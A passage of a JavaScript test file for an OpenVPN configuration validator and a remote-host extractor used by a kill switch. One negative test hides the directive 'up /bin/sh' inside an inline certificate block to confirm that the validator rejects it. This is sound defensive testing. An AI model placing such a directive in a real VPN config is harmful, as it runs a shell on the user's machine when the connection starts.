  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN + '<ca>\ndeadbeef\n</ca>\n'), /<ca> is repeated/)
})

test('assertSafeOpenVpnConfig rejects a directive smuggled inside an inline block', () => {
  const evil = CLEAN_OVPN.replace(
    '-----END CERTIFICATE-----\n</ca>',
    '-----END CERTIFICATE-----\nup /bin/sh\n</ca>',
  )
  assert.throws(() => assertSafeOpenVpnConfig(evil), /non-PEM line/)
})

test('assertSafeOpenVpnConfig rejects an unterminated block', () => {
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('</tls-crypt>', '')), /unterminated/)
})

test('assertSafeOpenVpnConfig requires the full PKI and the client essentials', () => {
  for (const tag of ['ca', 'cert', 'key', 'tls-crypt']) {
    const without = CLEAN_OVPN.replace(new RegExp(`<${tag}>[\\s\\S]*?</${tag}>\\n`), '')
    assert.throws(() => assertSafeOpenVpnConfig(without), new RegExp(`<${tag}> is missing`))
  }
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('client\n', '')), /"client" is missing/)
  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('remote 203.0.113.10 1194\n', '')), /"remote" is missing/)
})

test('extractOpenVpnRemoteHost reads the endpoint host for the kill switch', () => {
  assert.equal(extractOpenVpnRemoteHost(CLEAN_OVPN), '203.0.113.10')
  assert.equal(extractOpenVpnRemoteHost('remote [2001:db8::1] 1194'), '2001:db8::1')
  assert.equal(extractOpenVpnRemoteHost('remote node.example.com 443'), 'node.example.com')
  assert.equal(extractOpenVpnRemoteHost('client\ndev sntl-ovpn'), null)
})
